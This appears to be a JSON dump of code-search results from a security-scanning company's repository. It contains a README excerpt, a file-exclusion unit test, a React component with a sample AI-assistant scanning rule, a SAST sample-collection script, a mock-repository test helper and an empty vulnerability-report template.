index.html","lineNumber":137},{"text":"└── test/","lineNumber":138},{"text":"    └── java/","lineNumber":139},{"text":"        └── com/example/fileapi/","lineNumber":140},{"text":"            └── FileApiApplicationTests.java","lineNumber":141},{"text":"\`\`\`","lineNumber":142},{"lineNumber":143},{"text":"### Running Tests","lineNumber":144},{"lineNumber":145},{"text":"\`\`\`bash","lineNumber":146},{"text":"mvn test","lineNumber":147},{"text":"\`\`\`","lineNumber":148},{"lineNumber":149},{"text":"### Building JAR","lineNumber":150},{"lineNumber":151},{"text":"\`\`\`bash","lineNumber":152},{"text":"mvn clean package","lineNumber":153},{"text":"\`\`\`","lineNumber":154},{"lineNumber":155},{"text":"The executable JAR will be created in the \`target/\` directory.","lineNumber":156},{"lineNumber":157},{"text":"## License","lineNumber":158},{"lineNumber":159},{"text":"This project is open source and available under the MIT License. ","lineNumber":160}]},"score":0.288938045501709},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/fileUtils.unit.test.ts","range":{"startPosition":{"line":16,"column":3},"endPosition":{"line":1261,"column":1}},"contents":"\\n...\\ndescribe('FileUtils', () => {\\n  ...\\n  describe('isExcludedFileType', () => {\\n\\n\\n    ...\\n\\n\\n    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\n      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\n      const excludedFiles = [\\n        // Snapshot and environment files\\n        'test.snap',\\n        'secrets.env.vault',\\n        '.env',\\n        // Configuration formats not supported for analysis\\n        'config.toml',\\n        'app.ini',\\n        'server.conf',\\n        'settings.config',\\n        // Documentation files\\n        'README.md',\\n        'notes.txt',\\n        'guide.rst',\\n        'manual.adoc',\\n        // Lock files (except important project ones handled separately)\\n        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\n        // Image and media files\\n        'logo.png',\\n        'photo.jpg',\\n        'image.jpeg',\\n        'animation.gif',\\n        'favicon.ico',\\n        'banner.webp',\\n        'texture.bmp',\\n        'print.tiff',\\n        // Font files\\n        'font.ttf',\\n        'typeface.otf',\\n        'web.woff',\\n        'modern.woff2',\\n        'legacy.eot',\\n        // Archive files\\n        'backup.zip',\\n        'archive.tar',\\n        'compressed.gz',\\n        'files.rar',\\n        'data.7z',\\n        // Log and database files\\n        'app.log',\\n        'data.db',\\n        'cache.sqlite',\\n        'schema.sql',\\n        // Certificate and key files\\n        'cert.pem',\\n        'ssl.crt',\\n        'private.key',\\n        'identity.p12',\\n        'cert.pfx',\\n        // Editor and system files\\n        '.editorconfig',\\n        'project.sublime-project',\\n        'workspace.sublime-workspace',\\n        '.DS_Store',\\n        'Thumbs.db',\\n        // Coverage and build artifacts\\n        'coverage.lcov',\\n        'app.exe',\\n        'library.dll',\\n        'libmath.so',\\n        'framework.dylib',\\n        'Main.class',\\n        'module.pyc',\\n        'cache.pyo',\\n        'object.o',\\n        'binary.obj',\\n        // Minified and bundled files (even with supported extensions)\\n        'jquery.min.js',\\n        'bootstrap.min.css'","originalContents":"\\n\\n    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {\\n      // Test ALL patterns from EXCLUDED_FILE_PATTERNS\\n      const excludedFiles = [\\n        // Snapshot and environment files\\n        'test.snap',\\n        'secrets.env.vault',\\n        '.env',\\n        // Configuration formats not supported for analysis\\n        'config.toml',\\n        'app.ini',\\n        'server.conf',\\n        'settings.config',\\n        // Documentation files\\n        'README.md',\\n        'notes.txt',\\n        'guide.rst',\\n        'manual.adoc',\\n        // Lock files (except important project ones handled separately)\\n        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES\\n        // Image and media files\\n        'logo.png',\\n        'photo.jpg',\\n        'image.jpeg',\\n        'animation.gif',\\n        'favicon.ico',\\n        'banner.webp',\\n        'texture.bmp',\\n        'print.tiff',\\n        // Font files\\n        'font.ttf',\\n        'typeface.otf',\\n        'web.woff',\\n        'modern.woff2',\\n        'legacy.eot',\\n        // Archive files\\n        'backup.zip',\\n        'archive.tar',\\n        'compressed.gz',\\n        'files.rar',\\n        'data.7z',\\n        // Log and database files\\n        'app.log',\\n        'data.db',\\n        'cache.sqlite',\\n        'schema.sql',\\n        // Certificate and key files\\n        'cert.pem',\\n        'ssl.crt',\\n        'private.key',\\n        'identity.p12',\\n        'cert.pfx',\\n        // Editor and system files\\n        '.editorconfig',\\n        'project.sublime-project',\\n        'workspace.sublime-workspace',\\n        '.DS_Store',\\n        'Thumbs.db',\\n        // Coverage and build artifacts\\n        'coverage.lcov',\\n        'app.exe',\\n        'library.dll',\\n        'libmath.so',\\n        'framework.dylib',\\n        'Main.class',\\n        'module.pyc',\\n        'cache.pyo',\\n        'object.o',\\n        'binary.obj',\\n        // Minified and bundled files (even with supported extensions)\\n        'jquery.min.js',\\n        'bootstrap.min.css'","detailedLines":[{"text":"describe('FileUtils', () => {","lineNumber":19},{"text":"  let mockRepo: MockRepo","lineNumber":20},{"lineNumber":29},{"lineNumber":30},{"text":"  describe('isExcludedFileType', () => {","lineNumber":31},{"text":"    it","lineNumber":32},{"lineNumber":36},{"text":"() => {","lineNumber":76},{"text":" {","lineNumber":207},{"text":"        expect(FileUtils.isExcludedFileType(file)).toBe(false)","lineNumber":208},{"text":"      }","lineNumber":209},{"text":"    })","lineNumber":210},{"lineNumber":211},{"text":"    it('should comprehensively test all EXCLUDED_FILE_PATTERNS', () => {","lineNumber":212},{"text":"      // Test ALL patterns from EXCLUDED_FILE_PATTERNS","lineNumber":213},{"text":"      const excludedFiles = [","lineNumber":214},{"text":"        // Snapshot and environment files","lineNumber":215},{"text":"        'test.snap',","lineNumber":216},{"text":"        'secrets.env.vault',","lineNumber":217},{"text":"        '.env',","lineNumber":218},{"text":"        // Configuration formats not supported for analysis","lineNumber":219},{"text":"        'config.toml',","lineNumber":220},{"text":"        'app.ini',","lineNumber":221},{"text":"        'server.conf',","lineNumber":222},{"text":"        'settings.config',","lineNumber":223},{"text":"        // Documentation files","lineNumber":224},{"text":"        'README.md',","lineNumber":225},{"text":"        'notes.txt',","lineNumber":226},{"text":"        'guide.rst',","lineNumber":227},{"text":"        'manual.adoc',","lineNumber":228},{"text":"        // Lock files (except important project ones handled separately)","lineNumber":229},{"text":"        'some.lock', // Note: yarn.lock, package-lock.json etc. are IMPORTANT_PROJECT_FILES","lineNumber":230},{"text":"        // Image and media files","lineNumber":231},{"text":"        'logo.png',","lineNumber":232},{"text":"        'photo.jpg',","lineNumber":233},{"text":"        'image.jpeg',","lineNumber":234},{"text":"        'animation.gif',","lineNumber":235},{"text":"        'favicon.ico',","lineNumber":236},{"text":"        'banner.webp',","lineNumber":237},{"text":"        'texture.bmp',","lineNumber":238},{"text":"        'print.tiff',","lineNumber":239},{"text":"        // Font files","lineNumber":240},{"text":"        'font.ttf',","lineNumber":241},{"text":"        'typeface.otf',","lineNumber":242},{"text":"        'web.woff',","lineNumber":243},{"text":"        'modern.woff2',","lineNumber":244},{"text":"        'legacy.eot',","lineNumber":245},{"text":"        // Archive files","lineNumber":246},{"text":"        'backup.zip',","lineNumber":247},{"text":"        'archive.tar',","lineNumber":248},{"text":"        'compressed.gz',","lineNumber":249},{"text":"        'files.rar',","lineNumber":250},{"text":"        'data.7z',","lineNumber":251},{"text":"        // Log and database files","lineNumber":252},{"text":"        'app.log',","lineNumber":253},{"text":"        'data.db',","lineNumber":254},{"text":"        'cache.sqlite',","lineNumber":255},{"text":"        'schema.sql',","lineNumber":256},{"text":"        // Certificate and key files","lineNumber":257},{"text":"        'cert.pem',","lineNumber":258},{"text":"        'ssl.crt',","lineNumber":259},{"text":"        'private.key',","lineNumber":260},{"text":"        'identity.p12',","lineNumber":261},{"text":"        'cert.pfx',","lineNumber":262},{"text":"        // Editor and system files","lineNumber":263},{"text":"        '.editorconfig',","lineNumber":264},{"text":"        'project.sublime-project',","lineNumber":265},{"text":"        'workspace.sublime-workspace',","lineNumber":266},{"text":"        '.DS_Store',","lineNumber":267},{"text":"        'Thumbs.db',","lineNumber":268},{"text":"        // Coverage and build artifacts","lineNumber":269},{"text":"        'coverage.lcov',","lineNumber":270},{"text":"        'app.exe',","lineNumber":271},{"text":"        'library.dll',","lineNumber":272},{"text":"        'libmath.so',","lineNumber":273},{"text":"        'framework.dylib',","lineNumber":274},{"text":"        'Main.class',","lineNumber":275},{"text":"        'module.pyc',","lineNumber":276},{"text":"        'cache.pyo',","lineNumber":277},{"text":"        'object.o',","lineNumber":278},{"text":"        'binary.obj',","lineNumber":279},{"text":"        // Minified and bundled files (even with supported extensions)","lineNumber":280},{"text":"        'jquery.min.js',","lineNumber":281},{"text":"        'bootstrap.min.css',","lineNumber":282},{"text":"        'index.min.html'","lineNumber":283},{"text":",","lineNumber":371},{"text":"      ]","lineNumber":372},{"text":"    }","lineNumber":377},{"text":"  }","lineNumber":520},{"text":"}","lineNumber":1262}]},"score":0.2807697057723999},{"codeBlock":{"relativeWorkspacePath":"services/app/src/components/Analysis/collapsible/GenerateAIRule.tsx","range":{"startPosition":{},"endPosition":{"line":153,"column":1}},"contents":"import { useToast } from '@mobb/app/context/toast'\\nimport {\\n  Button,\\n  Dialog,\\n  Flex,\\n  keyframes,\\n  RawButton,\\n  styled,\\n  SvgCross,\\n  Text,\\n} from '@mobb/components'\\nimport { useState } from 'react'\\nimport { useSearchParams } from 'react-router-dom'\\n\\nconst sampleRule = \`---\\nalwaysApply: true\\n---\\n# Security Rules for Mobb Vulnerability Scanning\\n## MANDATORY: Mobb Scan Protocol\\n**CRITICAL**: After implementing any new features or making code changes, you MUST:\\n1. **ALWAYS run Mobb scan after implementation**: Use \\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\` tool to scan the new/modified code\\n2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\`.cursor/rules/\\\\\` to prevent the vulnerability type from recurring\\n3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\n## Rule Addition Protocol\\nWhen Mobb produces a fix:\\n- Extract the vulnerability type (e.g., \\"Command Injection\\", \\"SQL Injection\\", \\"XSS\\")\\n- Create a generic prevention rule for that vulnerability type\\n- **If rule file exists**: Add new information to the existing \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` file\\n- **If rule file doesn't exist**: Create a new rule file: \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` (e.g., \\\\\`command-injection.mdc\\\\\`)\\n- Add the rule with clear, actionable guidance and \\\\\`alwaysApply: true\\\\\`\\n- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\n- Update the main security.mdc to reference the rule file (if it's new)\\n## Active Security Rules\\n## Enforcement\\n- This rule is ALWAYS APPLIED and cannot be bypassed\\n- Any AI assistant that fails to follow this protocol should be corrected immediately\\n- Team members should verify that security scans are run before code reviews\`","originalContents":"import { useToast } from '@mobb/app/context/toast'\\nimport {\\n  Button,\\n  Dialog,\\n  Flex,\\n  keyframes,\\n  RawButton,\\n  styled,\\n  SvgCross,\\n  Text,\\n} from '@mobb/components'\\nimport { useState } from 'react'\\nimport { useSearchParams } from 'react-router-dom'\\n\\nconst sampleRule = \`---\\nalwaysApply: true\\n---\\n# Security Rules for Mobb Vulnerability Scanning\\n## MANDATORY: Mobb Scan Protocol\\n**CRITICAL**: After implementing any new features or making code changes, you MUST:\\n1. **ALWAYS run Mobb scan after implementation**: Use \\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\` tool to scan the new/modified code\\n2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\`.cursor/rules/\\\\\` to prevent the vulnerability type from recurring\\n3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found\\n## Rule Addition Protocol\\nWhen Mobb produces a fix:\\n- Extract the vulnerability type (e.g., \\"Command Injection\\", \\"SQL Injection\\", \\"XSS\\")\\n- Create a generic prevention rule for that vulnerability type\\n- **If rule file exists**: Add new information to the existing \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` file\\n- **If rule file doesn't exist**: Create a new rule file: \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` (e.g., \\\\\`command-injection.mdc\\\\\`)\\n- Add the rule with clear, actionable guidance and \\\\\`alwaysApply: true\\\\\`\\n- Make the rule specific enough to prevent the issue but generic enough to apply broadly\\n- Update the main security.mdc to reference the rule file (if it's new)\\n## Active Security Rules\\n## Enforcement\\n- This rule is ALWAYS APPLIED and cannot be bypassed\\n- Any AI assistant that fails to follow this protocol should be corrected immediately\\n- Team members should verify that security scans are run before code reviews\`","detailedLines":[{"text":"import { useToast } from '@mobb/app/context/toast'","lineNumber":1},{"text":"import {","lineNumber":2},{"text":"  Button,","lineNumber":3},{"text":"  Dialog,","lineNumber":4},{"text":"  Flex,","lineNumber":5},{"text":"  keyframes,","lineNumber":6},{"text":"  RawButton,","lineNumber":7},{"text":"  styled,","lineNumber":8},{"text":"  SvgCross,","lineNumber":9},{"text":"  Text,","lineNumber":10},{"text":"} from '@mobb/components'","lineNumber":11},{"text":"import { useState } from 'react'","lineNumber":12},{"text":"import { useSearchParams } from 'react-router-dom'","lineNumber":13},{"lineNumber":14},{"text":"const sampleRule = \`---","lineNumber":15},{"text":"alwaysApply: true","lineNumber":16},{"text":"---","lineNumber":17},{"text":"# Security Rules for Mobb Vulnerability Scanning","lineNumber":18},{"text":"## MANDATORY: Mobb Scan Protocol","lineNumber":19},{"text":"**CRITICAL**: After implementing any new features or making code changes, you MUST:","lineNumber":20},{"text":"1. **ALWAYS run Mobb scan after implementation**: Use \\\\\`mcp_mobb-mcp_scan_and_fix_vulnerabilities\\\\\` tool to scan the new/modified code","lineNumber":21},{"text":"2. **Add security rules**: For EVERY fix produced by Mobb, add a new generic security rule to a separate rule file in \\\\\`.cursor/rules/\\\\\` to prevent the vulnerability type from recurring","lineNumber":22},{"text":"3. **Document the process**: Always explain what security measures were taken and any vulnerabilities found","lineNumber":23},{"text":"## Rule Addition Protocol","lineNumber":24},{"text":"When Mobb produces a fix:","lineNumber":25},{"text":"- Extract the vulnerability type (e.g., \\"Command Injection\\", \\"SQL Injection\\", \\"XSS\\")","lineNumber":26},{"text":"- Create a generic prevention rule for that vulnerability type","lineNumber":27},{"text":"- **If rule file exists**: Add new information to the existing \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` file","lineNumber":28},{"text":"- **If rule file doesn't exist**: Create a new rule file: \\\\\`.cursor/rules/[vulnerability-type].mdc\\\\\` (e.g., \\\\\`command-injection.mdc\\\\\`)","lineNumber":29},{"text":"- Add the rule with clear, actionable guidance and \\\\\`alwaysApply: true\\\\\`","lineNumber":30},{"text":"- Make the rule specific enough to prevent the issue but generic enough to apply broadly","lineNumber":31},{"text":"- Update the main security.mdc to reference the rule file (if it's new)","lineNumber":32},{"text":"## Active Security Rules","lineNumber":33},{"text":"## Enforcement","lineNumber":34},{"text":"- This rule is ALWAYS APPLIED and cannot be bypassed","lineNumber":35},{"text":"- Any AI assistant that fails to follow this protocol should be corrected immediately","lineNumber":36},{"text":"- Team members should verify that security scans are run before code reviews\`","lineNumber":37},{"lineNumber":38},{"text":"export function GenerateAIRule() {","lineNumber":39,"isSignature":true},{"text":"  const [searchParams] = useSearchParams()","lineNumber":40},{"text":"}","lineNumber":154,"isSignature":true}]},"score":0.28029704093933105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":233},"endPosition":{"line":339}},"contents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","originalContents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","detailedLines":[{"text":"@dataclass","lineNumber":234},{"text":"class Sample:","lineNumber":235,"isSignature":true},{"lineNumber":237},{"text":"    report_path: str","lineNumber":238},{"text":"    source_archive_path: str","lineNumber":239},{"text":"    is_public: bool","lineNumber":240,"isSignature":true},{"lineNumber":241},{"lineNumber":242},{"text":"async def main(","lineNumber":243,"isSignature":true},{"text":"    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),","lineNumber":244,"isSignature":true},{"text":"):","lineNumber":245,"isSignature":true},{"text":"    with open(input_config_abs_path, \\"r\\") as f:","lineNumber":246},{"text":"        input_config = SamplerConfig.from_json(f.read())","lineNumber":247},{"lineNumber":248},{"text":"    print(f\\"Sampler config: {input_config}\\")","lineNumber":249},{"text":"    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")","lineNumber":250},{"lineNumber":251},{"text":"    samples = []","lineNumber":252},{"lineNumber":253},{"text":"    samples += await _get_customer_report_samples(input_config)","lineNumber":254},{"text":"    samples += await _get_dataset_samples(input_config)","lineNumber":255},{"lineNumber":256},{"text":"    samples = samples[0 : input_config.max_sample_count]","lineNumber":257},{"lineNumber":258},{"text":"    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])","lineNumber":259},{"lineNumber":260},{"text":"    if sast_issue_type_used != set(input_config.sast_issue_types):","lineNumber":261},{"text":"        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used","lineNumber":262},{"text":"        print(","lineNumber":263},{"text":"            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"","lineNumber":264},{"text":"        )","lineNumber":265},{"lineNumber":266},{"text":"    await _save_output(input_config, samples)","lineNumber":267},{"text":"    print(\\"Done\\")","lineNumber":268,"isSignature":true},{"lineNumber":269},{"lineNumber":270},{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    ","lineNumber":272}]},"score":0.2794812321662903},{"codeBlock":{"relativeWorkspacePath":"clients/cli/__tests__/mcp/helpers/MockRepo.ts","range":{"startPosition":{},"endPosition":{"line":464,"column":1}},"contents":"import * as path2 from 'node:path'\\n\\nimport { execFileSync, execSync } from 'child_process'\\nimport fs, {\\n  existsSync,\\n  mkdirSync,\\n  mkdtempSync,\\n  readFileSync,\\n  rmSync,\\n  utimesSync,\\n  writeFileSync,\\n} from 'fs'\\nimport { tmpdir } from 'os'\\nimport { dirname, join } from 'path'\\nimport simpleGit from 'simple-git'\\n\\nimport { benignFileContent } from './fileContents'\\nimport { log } from './log'\\n\\n/**\\n * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\n * temporary repositories that are used throughout the test suites.\\n */\\nexport class MockRepo {\\n  /** Holds the path of the temporary repository managed by this instance */\\n  protected readonly repoPath: string\\n\\n  /** Holds the remote URL of the repository (if it's a git repo) */\\n  protected repoUrl: string = ''\\n\\n  /** Default set of sample files used by multiple helpers */\\n  protected readonly sampleFiles: string[] = [\\n    'sample1.py',\\n    'dir/sample2.py',\\n    'dir/dir2/sample3.py',\\n  ]\\n\\n  /** The list of files to create in the repository */\\n  protected readonly files: string[]\\n\\n  /** Path to the sample .gitignore file */\\n  protected readonly sampleGitignorePath = join(\\n    __dirname,\\n    '..',\\n    'mocks',\\n    'sample.gitignore'\\n  )\\n\\n  /**\\n   * Creates a new MockRepo instance\\n   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\n   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\n   */\\n  constructor(files?: string[], customPath?: string) {\\n    // Use provided files or default to sampleFiles\\n    this.files = files || this.sampleFiles\\n\\n    // Use custom path or create a temporary directory\\n    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\n    log('Created repository directory at:', this.repoPath)\\n  }","originalContents":"import * as path2 from 'node:path'\\n\\nimport { execFileSync, execSync } from 'child_process'\\nimport fs, {\\n  existsSync,\\n  mkdirSync,\\n  mkdtempSync,\\n  readFileSync,\\n  rmSync,\\n  utimesSync,\\n  writeFileSync,\\n} from 'fs'\\nimport { tmpdir } from 'os'\\nimport { dirname, join } from 'path'\\nimport simpleGit from 'simple-git'\\n\\nimport { benignFileContent } from './fileContents'\\nimport { log } from './log'\\n\\n/**\\n * Base MockRepo class that encapsulates helper methods for creating and cleaning up\\n * temporary repositories that are used throughout the test suites.\\n */\\nexport class MockRepo {\\n  /** Holds the path of the temporary repository managed by this instance */\\n  protected readonly repoPath: string\\n\\n  /** Holds the remote URL of the repository (if it's a git repo) */\\n  protected repoUrl: string = ''\\n\\n  /** Default set of sample files used by multiple helpers */\\n  protected readonly sampleFiles: string[] = [\\n    'sample1.py',\\n    'dir/sample2.py',\\n    'dir/dir2/sample3.py',\\n  ]\\n\\n  /** The list of files to create in the repository */\\n  protected readonly files: string[]\\n\\n  /** Path to the sample .gitignore file */\\n  protected readonly sampleGitignorePath = join(\\n    __dirname,\\n    '..',\\n    'mocks',\\n    'sample.gitignore'\\n  )\\n\\n  /**\\n   * Creates a new MockRepo instance\\n   * @param files Optional list of files to create in the repository (defaults to sampleFiles)\\n   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.\\n   */\\n  constructor(files?: string[], customPath?: string) {\\n    // Use provided files or default to sampleFiles\\n    this.files = files || this.sampleFiles\\n\\n    // Use custom path or create a temporary directory\\n    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))\\n    log('Created repository directory at:', this.repoPath)\\n  }","detailedLines":[{"text":"import * as path2 from 'node:path'","lineNumber":1},{"lineNumber":2},{"text":"import { execFileSync, execSync } from 'child_process'","lineNumber":3},{"text":"import fs, {","lineNumber":4},{"text":"  existsSync,","lineNumber":5},{"text":"  mkdirSync,","lineNumber":6},{"text":"  mkdtempSync,","lineNumber":7},{"text":"  readFileSync,","lineNumber":8},{"text":"  rmSync,","lineNumber":9},{"text":"  utimesSync,","lineNumber":10},{"text":"  writeFileSync,","lineNumber":11},{"text":"} from 'fs'","lineNumber":12},{"text":"import { tmpdir } from 'os'","lineNumber":13},{"text":"import { dirname, join } from 'path'","lineNumber":14},{"text":"import simpleGit from 'simple-git'","lineNumber":15},{"lineNumber":16},{"text":"import { benignFileContent } from './fileContents'","lineNumber":17},{"text":"import { log } from './log'","lineNumber":18},{"lineNumber":19},{"text":"/**","lineNumber":20},{"text":" * Base MockRepo class that encapsulates helper methods for creating and cleaning up","lineNumber":21},{"text":" * temporary repositories that are used throughout the test suites.","lineNumber":22},{"text":" */","lineNumber":23},{"text":"export class MockRepo {","lineNumber":24,"isSignature":true},{"text":"  /** Holds the path of the temporary repository managed by this instance */","lineNumber":25},{"text":"  protected readonly repoPath: string","lineNumber":26},{"lineNumber":27},{"text":"  /** Holds the remote URL of the repository (if it's a git repo) */","lineNumber":28},{"text":"  protected repoUrl: string = ''","lineNumber":29},{"lineNumber":30},{"text":"  /** Default set of sample files used by multiple helpers */","lineNumber":31},{"text":"  protected readonly sampleFiles: string[] = [","lineNumber":32},{"text":"    'sample1.py',","lineNumber":33},{"text":"    'dir/sample2.py',","lineNumber":34},{"text":"    'dir/dir2/sample3.py',","lineNumber":35},{"text":"  ]","lineNumber":36},{"lineNumber":37},{"text":"  /** The list of files to create in the repository */","lineNumber":38},{"text":"  protected readonly files: string[]","lineNumber":39},{"lineNumber":40},{"text":"  /** Path to the sample .gitignore file */","lineNumber":41},{"text":"  protected readonly sampleGitignorePath = join(","lineNumber":42},{"text":"    __dirname,","lineNumber":43},{"text":"    '..',","lineNumber":44},{"text":"    'mocks',","lineNumber":45},{"text":"    'sample.gitignore'","lineNumber":46},{"text":"  )","lineNumber":47},{"lineNumber":48},{"text":"  /**","lineNumber":49},{"text":"   * Creates a new MockRepo instance","lineNumber":50},{"text":"   * @param files Optional list of files to create in the repository (defaults to sampleFiles)","lineNumber":51},{"text":"   * @param customPath Optional custom path for the repository. If not provided, a temporary directory will be created.","lineNumber":52},{"text":"   */","lineNumber":53},{"text":"  constructor(files?: string[], customPath?: string) {","lineNumber":54},{"text":"    // Use provided files or default to sampleFiles","lineNumber":55},{"text":"    this.files = files || this.sampleFiles","lineNumber":56},{"lineNumber":57},{"text":"    // Use custom path or create a temporary directory","lineNumber":58},{"text":"    this.repoPath = customPath || mkdtempSync(join(tmpdir(), 'mcp-test-repo-'))","lineNumber":59},{"text":"    log('Created repository directory at:', this.repoPath)","lineNumber":60},{"text":"  }","lineNumber":61},{"lineNumber":62},{"text":"  /**","lineNumber":63},{"text":"   * Returns the path to the created repository","lineNumber":64},{"text":"   * @returns Path to the repository","lineNumber":65},{"text":"   */","lineNumber":66},{"text":"}","lineNumber":465,"isSignature":true}]},"score":0.27924689650535583},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/generator/templates/vulnerability_template.md.txt","range":{"startPosition":{},"endPosition":{"line":62}},"contents":"# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n### Detected by\\n\\n* [Add screenshots from highlight nodes here]\\n\\n### Respected by\\n\\n* SAST provider name\\n* ...\\n\\n## 5. Other Information\\n\\n### Required Imports and Packages\\n\\nNone\\n\\n### User Questions\\n\\nNone\\n\\n### Open Items\\n\\nNone\\n\\n### Read More\\n\\n* https://deu.ast.checkmarx.net/presets/sast\\n* https://codeql.github.com/codeql-query-help/python/\\n* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\n* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\n* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\n* https://rules.sonarsource.com/python/\\n","originalContents":"# {vuln_name}\\n\\n## 1. Vulnerability Description\\n\\n[Describe the vulnerability here]\\n\\n## 2. How It Works\\n\\n[Explain how the vulnerability works]\\n\\n## 3. Vulnerable Code Examples\\n\\n### Example 1\\n\`\`\`{language}\\n// Add vulnerable code example here\\n\`\`\`\\n\\n## 4. Remediation Strategies\\n\\n### Safe Code Examples\\n\`\`\`{language}\\n// Add safe code example here\\n\`\`\`\\n\\n## 5. False Positives Detection\\n\\n### More Safe Code Examples\\n\`\`\`{language}\\n// Add more safe code example here or refer to previous examples\\n\`\`\`\\n\\n### Detected by\\n\\n* [Add screenshots from highlight nodes here]\\n\\n### Respected by\\n\\n* SAST provider name\\n* ...\\n\\n## 5. Other Information\\n\\n### Required Imports and Packages\\n\\nNone\\n\\n### User Questions\\n\\nNone\\n\\n### Open Items\\n\\nNone\\n\\n### Read More\\n\\n* https://deu.ast.checkmarx.net/presets/sast\\n* https://codeql.github.com/codeql-query-help/python/\\n* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak\\n* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity\\n* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules\\n* https://rules.sonarsource.com/python/\\n","detailedLines":[{"text":"# {vuln_name}","lineNumber":1},{"lineNumber":2},{"text":"## 1. Vulnerability Description","lineNumber":3},{"lineNumber":4},{"text":"[Describe the vulnerability here]","lineNumber":5},{"lineNumber":6},{"text":"## 2. How It Works","lineNumber":7},{"lineNumber":8},{"text":"[Explain how the vulnerability works]","lineNumber":9},{"lineNumber":10},{"text":"## 3. Vulnerable Code Examples","lineNumber":11},{"lineNumber":12},{"text":"### Example 1","lineNumber":13},{"text":"\`\`\`{language}","lineNumber":14},{"text":"// Add vulnerable code example here","lineNumber":15},{"text":"\`\`\`","lineNumber":16},{"lineNumber":17},{"text":"## 4. Remediation Strategies","lineNumber":18},{"lineNumber":19},{"text":"### Safe Code Examples","lineNumber":20},{"text":"\`\`\`{language}","lineNumber":21},{"text":"// Add safe code example here","lineNumber":22},{"text":"\`\`\`","lineNumber":23},{"lineNumber":24},{"text":"## 5. False Positives 